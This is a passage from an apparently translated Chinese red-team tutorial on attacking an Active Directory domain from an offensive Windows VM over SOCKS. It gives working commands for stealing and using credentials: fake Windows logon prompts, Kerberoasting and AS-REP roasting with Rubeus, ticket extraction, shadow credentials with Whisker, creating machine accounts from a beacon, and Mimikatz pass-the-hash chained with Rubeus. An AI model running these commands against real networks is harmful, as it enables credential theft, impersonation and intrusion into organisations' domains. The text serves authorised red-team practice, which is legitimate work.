<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ad,DC=bitsadmin,DC=com</span><br></pre></td></tr></table></figure>

<p>接下来，将 <code>cACertificate</code> 属性的值存储到文本文件（<code>certs.txt</code>）中。如果使用 ADExplorer，这些是由空格分隔的整数，表示字节，每个证书之间用换行符分隔。以下 Python3 代码段可将 <code>certs.txt</code> 文件转换为 <code>.crt</code> 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;certs.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">   certs = f.read()</span><br><span class="line"></span><br><span class="line"> i = 1</span><br><span class="line"> for cert in certs.split(&#x27;\n&#x27;):</span><br><span class="line">   certbin = bytes([int(c) for c in cert.split(&#x27; &#x27;)])</span><br><span class="line">   with open(&#x27;%i.crt&#x27; % i, &#x27;wb&#x27;) as f:</span><br><span class="line">     f.write(certbin)</span><br><span class="line">   i += 1</span><br></pre></td></tr></table></figure>



<h4><span id="选项-2从受害者系统中获取企业-ntauth-存储">选项 #2：从受害者系统中获取企业 NTAuth 存储</span></h4><p>企业 NTAuth 存储也存储在域中的系统中，比如可能是我们控制的受害者系统。以下 PowerShell 代码示例展示了如何从注册表中提取根证书，并将其存储为 <code>.crt</code> 文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$certs = Get-ChildItem HKLM:\SOFTWARE\Microsoft\EnterpriseCertificates\NTAuth\Certificates</span><br><span class="line"> $certs | ForEach-Object &#123;</span><br><span class="line">   $d = $_ | Get-ItemPropertyValue -Name Blob</span><br><span class="line">   $c = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList $d, &#x27;&#x27;</span><br><span class="line">   $c</span><br><span class="line">   $b = $c.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert)</span><br><span class="line">   [System.IO.File]::WriteAllBytes(&quot;$pwd\$($c.DnsNameList[0].Unicode).crt&quot;, $b)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4><span id="选项-3从-tls-端口提取证书链">选项 #3：从 TLS 端口提取证书链</span></h4><p>每当在域内的 TLS 端口上运行的服务使用正确签名的证书时，可以通过 TLS 握手提取证书。例如，可以通过 PowerShell 提取域控制器的 LDAPS 端口证书。LOFL 仓库中的 <code>CollectCerts.ps1</code> 脚本可以帮助连接到 TLS 端口并提取证书。该脚本需要连接的主机名称（例如 <code>DC1.ad.bitsadmin.com</code>）和可选的端口（默认端口为 636&#x2F;TCP）。证书将存储在当前工作目录中。</p>
<p>当发现某个运行在 TLS 端口上的 Web 服务器时，可以简单地在浏览器中访问该网页，查看证书详情，并使用浏览器的功能将证书存储到磁盘。另一种方法是使用任何有效工具（例如 <code>openssl</code> 客户端）连接到 TLS 端口，同时让 Wireshark 在网络接口上监听，然后从服务器 hello 消息中提取证书。</p>
<h4><span id="选项-4证书注册">选项 #4：证书注册</span></h4><p>在域控制器 <code>\\ad.bitsadmin.com\CertEnroll</code> 或其他证书颁发机构服务器上，存在一个名为 CertEnroll 的共享文件夹。该共享中包含证书链的证书（.crt 文件）。</p>
<h3><span id="导入证书">导入证书</span></h3><p>一旦通过上述任一方法获得根证书，下一步是打开本地计算机证书管理器（<code>certlm.msc</code>），导航到 <strong>受信任根证书颁发机构</strong>，右键点击 <strong>证书</strong>，在 <strong>所有任务</strong> 菜单中选择 <strong>导入</strong>。在向导中，选择通过之前讨论的选项获得的 <code>.crt</code> 文件，并对所有获得的 <code>.crt</code> 文件重复此操作。</p>
<h3><span id="本地-intranet-区域">本地 Intranet 区域</span></h3><p>为了允许对目标域中网站（包括 WebDAV）进行自动（Kerberos）认证，攻击性 Windows 虚拟机需要信任要发送认证信息的主机名。为此，打开 <strong>Internet 选项</strong> 控制面板小程序（<code>inetcpl.cpl</code>），导航到 <strong>安全</strong> 标签（也可以直接通过 <code>inetcpl.cpl ,1</code> 访问）。接下来，选择 <strong>本地 intranet 区域</strong>，点击 <strong>站点</strong>，在弹出的 <strong>本地 intranet</strong> 窗口中，选择 <strong>高级</strong>。最后，逐个将目标域添加到该区域的站点列表中，例如：<code>*.ad.bitsadmin.com</code>、<code>*.corp.int</code> 和 <code>*.research.dev</code>。</p>
<h3><span id="webdav">WebDAV</span></h3><p>另一个要求顺利认证 WebDAV 的设置是 AuthForwardServerList，它是 WebClient 服务参数中的一个设置。若需要对 WebDAV 共享进行 Kerberos 认证，则需要配置此项。以下 PowerShell 代码展示了如何添加不同的域。必须重启 WebClient 服务才能使配置生效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\WebClient\Parameters -Name AuthForwardServerList -PropertyType MultiString -Value &#x27;*.ad.bitsadmin.com&#x27;,&#x27;*.corp.int&#x27;,&#x27;*.research.dev&#x27;</span><br><span class="line">Restart-Service WebClient</span><br></pre></td></tr></table></figure>

<h2><span id="获取凭证信息">获取凭证信息</span></h2><p>通过 SOCKS 攻击目标网络的一个缺点是认证问题。在软件植入中执行代码时，认证通常是透明进行的，而当 Offensive Windows VM 遇到认证挑战时，它并没有凭证信息可用。本节将讨论通过软件植入获取凭证信息的不同方式，除非另有说明，这些方法可以作为低权限用户执行。将讨论的凭证类型包括明文、Kerberos TGT&#x2F;TGS、证书和哈希。所有提到的工具都是 .NET 程序集，支持大多数 C2 框架在软件植入的内存中执行。</p>
<h3><span id="明文凭证">明文凭证</span></h3><p>最直接的凭证是明文的域用户名和密码。在红队演练中，这些凭证可以作为假设的妥协场景的一部分，攻击者会接收到与普通员工入职时相同的凭证和设备。</p>
<h4><span id="社会工程">社会工程</span></h4><p>一种替代方法是通过伪造凭证提示来诱使用户输入凭证。这种方法的一个示例是我曾经编写的 FakeLogonScreen 工具，它模仿了 Windows 锁屏，同时将所有附加连接的屏幕变黑。用户输入凭证后，凭证会先进行验证，如果正确，屏幕会消失，用户可以继续工作。在此过程中，攻击者可以从植入代码的控制台中读取用户输入的凭证。</p>
<p>另一个工具是 SharpLoginPrompt，由 Shantanu Khandelwal (@shantanukhande) 开发，它向用户显示一个伪造的 Windows 身份验证提示，要求用户输入凭证。再次强调，用户输入的凭证会显示在植入代码的控制台中。</p>
<h4><span id="创建计算机帐户">创建计算机帐户</span></h4><p>用于 <strong>Offensive Windows VM</strong> 的域帐户不需要是运行软件植入的用户帐户，也不需要是用户帐户。默认情况下，Active Directory 允许任何域用户创建最多 10 个计算机帐户（此数量由 <code>ms-DS-MachineAccountQuota</code> Active Directory 属性设置）。由于植入代码运行在用户的会话中，它可能能够创建新的计算机帐户，并且攻击者可以指定计算机名称和密码。一个能够提供此功能的工具是 <strong>StandIn</strong>，由 Ruben Boonen (@FuzzySec) 开发。以下命令将创建一个新的计算机帐户，并显示工具自动生成的密码，或者也可以使用 <code>--pass</code> 参数提供密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; bofnet_executeassembly StandIn --computer DESKTOP-B1T54DM --make</span><br><span class="line">[*] Attempting to start .NET assembly in blocking mode</span><br><span class="line">[+] host called home, sent: 10005 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">[?] Using DC  : DC1.ad.bitsadmin.com</span><br><span class="line">|_ Domain  : ad.bitsadmin.com</span><br><span class="line">|_ DN    : CN=DESKTOP-B1T54DM,CN=Computers,DC=ad,DC=bitsadmin,DC=com</span><br><span class="line">|_ Password : zSMhVdxWCxhGNsW</span><br><span class="line"></span><br><span class="line">[+] Machine account added to AD..</span><br></pre></td></tr></table></figure>

<h4><span id="internal-monologue">Internal monologue</span></h4><p>Internal monologue是 Elad Shamir (@elad_shamir) 发现的一种攻击。在这种攻击中，会与 Windows 的 NTLM 安全支持提供程序 (SSP) 进行交互，以计算当前用户上下文中的 NetNTLM 响应。随后，攻击者可离线破解 NetNTLM 响应，并根据密码强度恢复明文密码。为了增加成功几率，还可以通过修改注册表中的一些值，将 NetNTLMv2 协议降级为 NetNTLMv1 协议。不过，这要求植入的软件必须在具有本地管理权限的用户下运行，而且还可能导致系统上运行的安全软件发出警报。</p>
<p>能够执行这种攻击的工具是 Internal-Monologue，它只需执行而无需参数： InternalMonologue. 通过添加 -Downgrade True 参数，可以强制降级到更容易破解的 NetNTLMv1。</p>
<h4><span id="dpapi-主密钥">DPAPI 主密钥</span></h4><p>DPAPI（数据保护 API）是 Windows 的数据保护 API，用于安全地存储和检索 Windows 中的机密信息。DPAPI 的工作原理是，将存储机密信息的文件加密，且加密是使用一个主密码，而这个主密码又是用用户的密码加密的。因此，如果攻击者能够获取包含 DPAPI 主密码的文件，攻击者就可以尝试离线破解该文件，从而恢复用户的密码。</p>
<p>一个可以从该主密钥文件中获取可破解哈希值的工具是 <strong>DPAPISnoop</strong>，由 Lefteris Panos (@lefterispan) 开发。此工具可以直接执行而不带参数（<code>DPAPISnoop</code>），然后会在植入代码的控制台中显示可破解的哈希值。</p>
<h4><span id="kerberoasting">Kerberoasting</span></h4><p>Kerberoasting 是一种利用 Kerberos 验证协议弱点的技术。攻击者为特定账户申请一张票据授予服务（TGS）票据，该账户有一个与之相关的服务主名称（SPN）。由于 TGS 与账户密码一起加密，而且可以提取票据，攻击者可尝试离线破解 TGS，以恢复账户的明文密码。此外，攻击者可以尝试请求使用较弱加密（RC4）而非较强加密（AES）加密的 TGS，以加快破解速度。不过，这可能会以更差的 OPSEC 为代价。</p>
<p>Rubeus5 是一款能够执行Kerberoasting的工具。这种Kerberoasting既可以有针对性地进行，也可以大规模地进行，在后一种情况下，多个账户会同时受到攻击。使用 Rubeus 进行有针对性的Kerberoasting攻击可使用 Rubeus kerberoast &#x2F;user:TargetUser。</p>
<h4><span id="as-rep-roasting">AS-REP Roasting</span></h4><p>除了 Kerberoasting 之外，还有另一种称为 AS-REP Roasting 的技术。这种特定类型的攻击专门针对那些在 Active Directory 中设置了 “Do not require Kerberos preauthentication” 标志的账户。启用此标志后，攻击者无需认证即可请求一个 AS-REP 消息，该消息是用用户的密码加密的。攻击者可以尝试离线破解该 AS-REP 消息，如果成功，就可以恢复用户的明文密码。</p>
<p>Rubeus 工具能够执行 AS-REP Roasting 攻击，使用的命令行如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus asreproast /user:TargetUser</span><br></pre></td></tr></table></figure>

<h3><span id="tgtx2ftgs">TGT&#x2F;TGS</span></h3><p>另一种认证到 Active Directory 的方式是 Ticket Granting Ticket (TGT)。在 Active Directory 中，用户首先通过认证到域控制器（DC），然后 DC 会向用户提供一个 TGT。之后，每当用户尝试认证到域中的机器或服务时，TGT 会用于向 DC 请求一个 Ticket Granting Service (TGS)。一旦收到 TGS，就可以用它来认证到目标机器或服务。</p>
<h4><span id="tgt-委托">TGT 委托</span></h4><p>此技术利用 Windows 操作系统伪造一个 AS-REQ 请求，针对一个配置了 不受限委托（unconstrained delegation） 的服务主体名称（SPN）。伪造的 TGT 会从 通用安全服务 API (GSS-API) 中提取，获得当前用户的 TGT。例如，Rubeus 可以使用以下命令来执行此操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgtdeleg /nowrap</span><br></pre></td></tr></table></figure>

<h4><span id="tgs-提取">TGS 提取</span></h4><p>用户会话中请求的任何 TGS 都可以从系统中提取，并用于向特定服务认证。可以使用 Rubeus 首先列出当前用户会话中可用的 TGS，使用命令 <code>Rubeus triage</code>，然后通过以下命令提取这些票证：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus dump /nowrap /service:TargetService</span><br></pre></td></tr></table></figure>

<h3><span id="证书">证书</span></h3><p>在 Active Directory 中，另一种可以使用的认证方式是 证书。自从 2021 年 Will Schroeder (@harmj0y) 和 Lee Christensen (@tifkin_) 发布了关于 Active Directory Certificate Services (ADCS) 的广泛研究和相关工具 Certify 后，证书和 ADCS 的使用与滥用已经成为一种非常流行的提权向量。</p>
<h4><span id="证书服务">证书服务</span></h4><p>如果域中配置了 ADCS 且用户具有足够的权限，则可能能够请求一个可用于认证的证书。一个能够列出可用证书模板并随后请求这些证书的工具是 Certify。</p>
<h4><span id="影子凭证">影子凭证</span></h4><p>Active Directory 使用证书的一个示例场景是，当 Windows Hello for Business 用于终端时，启用该功能会透明地生成一对证书，并将其公钥存储在 Active Directory 中的用户对象中。作为攻击者，也可以生成一对密钥，并将公钥添加到帐户中。在攻击性安全领域，这通常被称为 影子凭证。</p>
<p>一个能够向帐户添加影子凭证的工具是 <strong>Whisker</strong>，其命令行如下： <code>Whisker add /target:TargetUser</code></p>
<p>需要注意的是，通常情况下，低权限用户可能没有足够的权限将公钥写入 Active Directory 用户对象中的 msDS-KeyCredentialLink 属性。如果前提条件满足，另一种替代方法是通过反向端口转发强制 victim 系统上的服务对攻击者进行认证，然后中继该认证以将影子凭证添加到 Active Directory 中的计算机帐户。由于计算机帐户通常能够向自己添加影子凭证，因此此方法成功的可能性较高。但需要注意的是，这种攻击超出了本文的讨论范围，无法在此详细描述。</p>
<h4><span id="影子凭证-2">影子凭证 #2</span></h4><p>另一种向用户对象的 msDS-KeyCredentialLink 属性添加影子凭证的替代方法是使用 altSecurityIdentities 属性。能够执行此操作的工具是 SharpAltSecIds（由 Jonas Vestberg 编写），其命令行如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpAltSecIds.exe a /target:TargetUser &quot;/altsecid:X509:DC=com,DC=bitsadmin,DC=ad,CN=LabSubCA1DC=com,DC=bitsadmin,DC=ad,CN=mycert&quot;</span><br></pre></td></tr></table></figure>

<h3><span id="hash">Hash</span></h3><p>在 Active Directory 中，可以使用的另一种凭证类型是 哈希。这包括 NTLM（RC4）哈希，也包括 AES128 和 AES256 等哈希类型。可以通过以下方式获取这些哈希：例如，在初始访问主机上进行权限提升，然后使用像 Mimikatz 这样的工具从内存中获取凭证信息。另一种获取 NTLM 哈希的方式是利用 Kerberos 的 PKINIT 功能，通过证书认证（见前一小节）来获取 NTLM 哈希。可以使用 Dirk Jan（@dirkjanm）提供的 PKINITtools 来获取该哈希。</p>
<h2><span id="准备凭证材料">准备凭证材料</span></h2><p>在深入讨论如何准备凭证材料之前，我们先来了解一下 Windows 中登录会话的工作原理。</p>
<h3><span id="登录会话与-netonly">登录会话与 <code>netonly</code></span></h3><p>登录会话 是一个计算会话，它从用户身份验证成功时开始，到用户注销系统时结束。当用户成功认证后，身份验证包会创建一个登录会话，并将信息返回给本地安全机构（LSA），这些信息用于为新用户创建令牌。</p>
<p>根据 <strong>CreateProcessWithLogonW</strong> 函数的 <strong>dwLogonFlags</strong> 参数文档，有两个选项用于登录。在这些选项中，<code>LOGON_NETCREDENTIALS_ONLY</code>（<code>netonly</code>）选项在 <strong>LOFL</strong> 中被广泛使用。因为使用的凭证与本地（攻击者）机器无关，所以无法以本地方式启动进程。然而，<code>netonly</code> 选项允许进程在当前用户会话下运行，但在后台会创建一个新的登录会话。这个登录会话会包含所提供的凭证材料，每当网络资源要求身份验证时，身份验证包会自动处理。</p>
<p>Windows 提供了多种身份验证包，其中与 LOFL 相关的有 NTLM、Kerberos 和 Negotiate。前两个身份验证包是显而易见的，而最后一个包会尝试使用 Kerberos 认证，如果失败，则回退到 NTLM 认证。如在“进攻性设置：进攻性 Windows 虚拟机”部分所述，出于 OPSEC（操作安全）的考虑，可以更改此行为，使 Windows 不会回退到 NTLM，而是直接失败。Negotiate 提供者是本节讨论的不同工具使用的身份验证提供者。</p>
<p>系统上活动的各种登录会话可以通过 <strong>Sysinternals</strong> 的 <code>logonsessions</code> 命令行工具显示，使用 <code>-p</code> 参数还可以列出与各个登录会话相关的进程。此外，还可以使用 <code>klist.exe</code> 查看当前窗口关联的登录会话的登录 ID。</p>
<h3><span id="加载凭证材料">加载凭证材料</span></h3><p>对于不同类型的凭证，有不同的方法将其加载到内存中。虽然 Windows 提供了内置的命令行工具来使用明文凭证对远程系统进行身份验证，但像证书、TGTs 和哈希等凭证则需要使用 Rubeus 和 Mimikatz 等工具。</p>
<p>为了开始，建议首先启动一个具有提升权限的 <code>cmd.exe</code> 命令提示符。此外，为了区分以特定凭证启动的控制台窗口，基于我的经验，最好始终通过使用不同的颜色为“基本” <code>cmd.exe</code> 窗口加上标签，例如，使用亮蓝色背景和白色文本：<code>color 1f</code>。这样，当需要时，可以通过这个窗口结束所有其他以不同凭证运行的进程，从而清理掉所有带有备用凭证材料的登录会话。</p>
<p><img src="/images/74.png" alt="74"></p>
<p>在 Windows 中需要注意的是，<strong>以高完整性（以管理员身份运行）</strong> 运行的进程与 <strong>以中等完整性</strong> 运行的进程具有不同的登录会话。对于 <strong>LOFL</strong>，建议启动一个高完整性的 <code>cmd.exe</code> 命令提示符。与中等完整性的命令提示符不同，推荐使用高完整性的命令提示符，因为一些 <strong>LOFLCAB</strong> 需要高权限的本地上下文才能执行，而这完全是可能的，因为进程是在攻击者的进攻性 Windows 虚拟机上执行的。</p>
<p>对于所有类型的凭证，有一点至关重要：在任何交互中都必须使用 <strong>完全限定域名（FQDN）</strong>（例如 <code>ad.bitsadmin.com</code>），而不是仅使用传统的域名（例如 <code>AD</code>），也称为 <strong>NetBIOS 域名</strong> 或 <strong>单标签域（SLD）</strong>。FQDN 对于 DNS 是必要的，因为配置在 Linux 路由器虚拟机上的 DNS 服务器可以将 DNS 请求定向到适当的主机。此外，进攻性 Windows 虚拟机中的 Kerberos 需要使用 FQDN，这样它才能解析相关的 DNS 记录，并向托管 <strong>密钥分发中心（KDC）</strong> 的域控制器（DC）的 Kerberos 端口（88&#x2F;TCP）发送请求。</p>
<p>为了避免每次都使用 FQDN，也可以为 DNS 配置目标域（例如 <code>ad.bitsadmin.com</code>）作为默认 DNS 后缀。这意味着，当例如使用 <strong>BAK1</strong>（非 FQDN）主机名作为命令目标时，Windows 会自动将 <code>ad.bitsadmin.com</code> 后缀附加到它，从而形成 <code>BAK1.ad.bitsadmin.com</code> 的 FQDN 主机名，然后通过目标网络的 DNS 服务器进行解析。出于 OPSEC 考虑，请注意任何非 FQDN 将会自动附加 DNS 后缀，这可能会导致对目标环境中的 DNS 服务器进行意外解析。此设置可以通过 GUI 或 PowerShell 配置。</p>
<p><strong>GUI 设置</strong>： <code>ncpa.cpl</code> -&gt; 网络适配器属性 -&gt; 互联网协议版本 4（TCP&#x2F;IPv4）属性 -&gt; 高级 -&gt; DNS -&gt; 添加这些 DNS 后缀 -&gt; 添加：<code>ad.bitsadmin.com</code>。</p>
<p><strong>PowerShell 设置</strong>： <code>Set-DnsClientGlobalSetting -SuffixSearchList &#39;ad.bitsadmin.com&#39;</code>，并使用 <code>Get-DnsClientGlobalSetting</code> 验证。</p>
<p>在本节中，对于每种类型的凭证，将讨论两种不同的加载凭证的方法：</p>
<ol>
<li><strong>启动一个新的 powershell.exe</strong></li>
</ol>
<p>从这个 <code>powershell.exe</code> 窗口，可以执行任何其他需要这些凭证的 <strong>LOFLCAB</strong>（例如，从与包含特定凭证材料的登录会话相关联的 <code>powershell.exe</code> 窗口，使用其 cmdlet 命令，这些命令会透明地使用包含相关凭证的身份验证提供程序）。此外，其他 <strong>LOFLCAB</strong>，例如 Microsoft 管理控制台（<code>mmc.exe</code>）或 Sysinternals Active Directory Explorer（<code>ADExplorer.exe</code>），也可以启动，这些工具在与远程系统通信时，如果需要进行身份验证，身份验证过程会由身份验证包透明地处理。下面的图示显示了系统中不同的登录会话，包括登录 ID、完整性级别以及用于网络身份验证的用户。此外，它还展示了可以打开多个不同的 PowerShell 窗口，并且这些窗口可以连接到不同的登录会话，其中每个会话都可能包含不同用户的凭证材料。</p>
<p><img src="/images/75.png" alt="75"></p>
<ol>
<li><strong>重新启动 explorer.exe</strong></li>
</ol>
<p>由于 <code>explorer.exe</code> 是操作系统的图形用户界面（GUI），且许多进程都在 <code>explorer.exe</code> 下启动，因此在某些情况下，重新启动 <code>explorer.exe</code> 并让它加载已准备好的凭证会话可能会非常有用。</p>
<p>一个例子是当你想使用 Windows 资源管理器浏览 SharePoint 文件夹时。一旦 <code>explorer.exe</code> 使用新凭证重新启动，接着可以启动 Internet Explorer（<code>iexplore.exe</code>），访问 SharePoint 网站（并通过 Kerberos 进行透明身份验证）。在 SharePoint 中，用户可以导航到文件夹，切换到经典体验并在库标签页中选择 “用资源管理器打开”。这将打开 Windows 资源管理器并显示该文件夹的内容，因为 Windows 资源管理器与包含相关凭证的登录会话相关联。</p>
<p><img src="/images/76.png" alt="76"></p>
<p>对于这种方法，重要的是要像之前所述那样将“基础”<code>cmd.exe</code>窗口标记为不同的颜色，因为否则很难返回到一个没有存储 <code>netonly</code> 凭证的干净登录会话。在这种情况下，为了返回到干净的登录会话，可以关闭桌面上的所有应用窗口，然后执行以下命令行，从一个不包含 <code>netonly</code> 凭证的登录会话中重新启动 <code>explorer.exe</code>。</p>
<p>taskkill.exe &#x2F;F &#x2F;IM explorer.exe &amp; explorer.exe</p>
<h4><span id="纯文本">纯文本</span></h4><p>最直接的凭证类型是纯文本用户名和密码。Windows 自带的 <code>runas.exe</code> 工具可以使用这些凭证。由于纯文本密码是可用的，这种方法支持通过 Kerberos 和 NTLM 进行身份验证。</p>
<p>PowerShell：</p>
<p><code>runas</code> 命令行如下所示，其中使用了 <code>/netonly</code> 参数，并且用户名之前加上了目标域的完全限定域名（FQDN）。在此示例中，FQDN 是 <code>ad.bitsadmin.com</code>，接着是反斜杠和用户名（User1），我们拥有该用户名的密码。按下 Enter 后，会弹出一个交互式密码提示框，要求输入密码，然后使用这些 <code>netonly</code> 凭证执行 <code>powershell.exe</code>。</p>
<p>runas.exe &#x2F;netonly &#x2F;user:ad.bitsadmin.com\User1 powershell.exe</p>
<p>在使用纯文本凭证的情况下，只有在执行某些操作并收到身份验证挑战时，身份验证包才会尝试进行身份验证。如果身份验证成功，它将存储收到的 TGT 和 TGS。如果身份验证失败，发起身份验证的 LOFLCAB 将报告身份验证失败（例如，在 <code>net.exe</code> 中，它会显示：访问被拒绝）。而在网络层面，Kerberos AS-REQ 的响应很可能是：如果使用了不存在的用户名，则为 <code>KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN</code>；如果用户密码错误，则为 <code>KRB5KDC_ERR_PREAUTH_FAILED</code>。</p>
<p>重新启动 Windows Explorer：</p>
<p>以下命令行首先用于杀死所有 <code>explorer.exe</code> 实例，然后使用新创建的登录会话和指定的凭证重新启动它。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill.exe /F /IM explorer.exe &amp; runas.exe /netonly /user:ad.bitsadmin.com\User1 &quot;C:\Windows\explorer.exe /NoUACCheck&quot;</span><br></pre></td></tr></table></figure>

<h4><span id="tgt">TGT</span></h4><p>当使用票据授权票（TGT）时，需要使用 Rubeus。Rubeus 提供了使用存储在 <code>.kirbi</code> 文件中的 TGT 或通过命令行提供的 base64 字符串创建 <code>netonly</code> 进程的选项。由于使用了 Negotiate 身份验证包，因此身份验证仍然可能回退到 NTLM 身份验证。然而，由于仅提供了 TGT，因此没有相应的凭证材料。</p>
<p>可以通过不提供 <code>/domain</code>、<code>/username</code> 和 <code>/password</code> 参数，仅使用 <code>/ticket</code> 参数执行 Rubeus 来进行身份验证，但是在这种情况下，Rubeus 会自动生成一个随机的域、用户名和密码，并将这些信息提供给身份验证包。然而，由于用户名将在目标域的日志中可见，这种做法对 OPSEC 来说是不安全的。因此，建议指定正确的域和 <code>/username</code> 参数，并使用 TGT 所属用户的用户名。最后，可以使用任何密码，因为可能没有有效的密码可用。如在“进攻性设置：进攻性 Windows VM”部分所讨论的那样，还可以禁用回退到 NTLM 以避免失败的 NTLM 身份验证。</p>
<p>PowerShell</p>
<p>使用 TGT 启动 PowerShell 的 Rubeus 命令行如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe createnetonly /domain:ad.bitsadmin.com /username:User1 /password:dummy /ticket:C:\tmp\User1.kirbi /program:powershell.exe /show</span><br></pre></td></tr></table></figure>

<p>重新启动 Windows Explorer：</p>
<p>以下命令行首先杀死所有 <code>explorer.exe</code> 实例，然后用新的登录会话重新启动它，并将 TGT 注入其中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill.exe /F /IM explorer.exe &amp; Rubeus.exe createnetonly /domain:ad.bitsadmin.com /username:User1 /password:dummy /ticket:C:\tmp\User1.kirbi /program:&quot;C:\Windows\explorer.exe /NoUACCheck&quot;</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="证书">证书</span></h4><p>对于基于证书的身份验证，Rubeus 也可以使用。为了使身份验证工作，必须提供目标域的 FQDN 作为 <code>/domain</code> 参数。此外，如果 <code>.pfx</code> 文件是密码保护的，则需要提供 <code>/password</code> 参数。如果证书已导入到攻击者的 Windows 存储中，则可以使用证书的指纹（thumbprint）作为 <code>/certificate</code> 参数，而不是提供证书路径。与 TGT&#x2F;TGS 身份验证类似，由于使用了 Negotiate 身份验证包，因此身份验证仍然可能回退到 NTLM 身份验证，这与 TGT&#x2F;TGT 身份验证时的含义相同。</p>
<p>PowerShell：</p>
<p>以下命令行可以用来使用基于证书的身份验证启动 PowerShell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /domain:ad.bitsadmin.com /user:User1 /certificate:C:\tmp\User1.pfx /password:PFXPass1! /createnetonly:powershell.exe /show</span><br></pre></td></tr></table></figure>

<p>重新启动 Windows Explorer：</p>
<p>以下命令行首先杀死所有 <code>explorer.exe</code> 实例，然后用新的登录会话重新启动它，并使用基于证书的身份验证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill.exe /F /IM explorer.exe &amp; Rubeus.exe asktgt /domain:ad.bitsadmin.com /user:Install /certificate:C:\tmp\User1.pfx /password:PFXPass1! /createnetonly:&quot;C:\Windows\explorer.exe /NoUACCheck&quot; /show</span><br></pre></td></tr></table></figure>

<h4><span id="ntlm-哈希">NTLM 哈希</span></h4><p>NTLM 哈希（也称为 RC4 哈希）可用于 Kerberos 和 NTLM 身份验证。为了支持这两种情况，可以结合使用 Mimikatz 和 Rubeus，其中 Mimikatz 负责 NTLM 身份验证，而 Rubeus 负责 Kerberos 身份验证。</p>
<p>PowerShell：</p>
<p>以下 Rubeus 命令行可以用来使用 NTLM 哈希启动 PowerShell，并支持 Kerberos 身份验证和 NTLM 回退：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set domain=ad.bitsadmin.com</span><br><span class="line">set user=User1</span><br><span class="line">set rc4=BEB7BFC1623370D9CD19DEB26C69097B</span><br><span class="line"></span><br><span class="line">mimikatz.exe privilege::debug &quot;sekurlsa::pth /domain:%domain% /user:%user% /ntlm:%rc4% /run:&quot;&quot;&quot;powershell.exe -NoExit -Command &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;Rubeus.exe asktgt /domain:%domain% /user:%user% /rc4:%rc4% /ptt&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; exit</span><br></pre></td></tr></table></figure>

<p>重新启动 Windows Explorer：</p>
<p>以下命令行首先杀死所有 <code>explorer.exe</code> 实例，然后使用 Mimikatz 和 Rubeus 将 NTLM 哈希和 Kerberos 票据注入到新的登录会话中，并重新启动 <code>explorer.exe</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set domain=ad.bitsadmin.com</span><br><span class="line">set user=User1</span><br><span class="line">set rc4=BEB7BFC1623370D9CD19DEB26C69097B</span><br><span class="line"></span><br><span class="line">taskkill /F /IM explorer.exe &amp; mimikatz.exe privilege::debug &quot;sekurlsa::pth /domain:%domain% /user:%user% /ntlm:%rc4% /run:&quot;&quot;&quot;cmd.exe /c Rubeus.exe asktgt /domain:%domain% /user:%user% /rc4:%rc4% /ptt ^&amp; start C:\Windows\explorer.exe /NoUACCheck&quot;&quot;&quot;&quot; exit</span><br></pre></td></tr></table></figure>

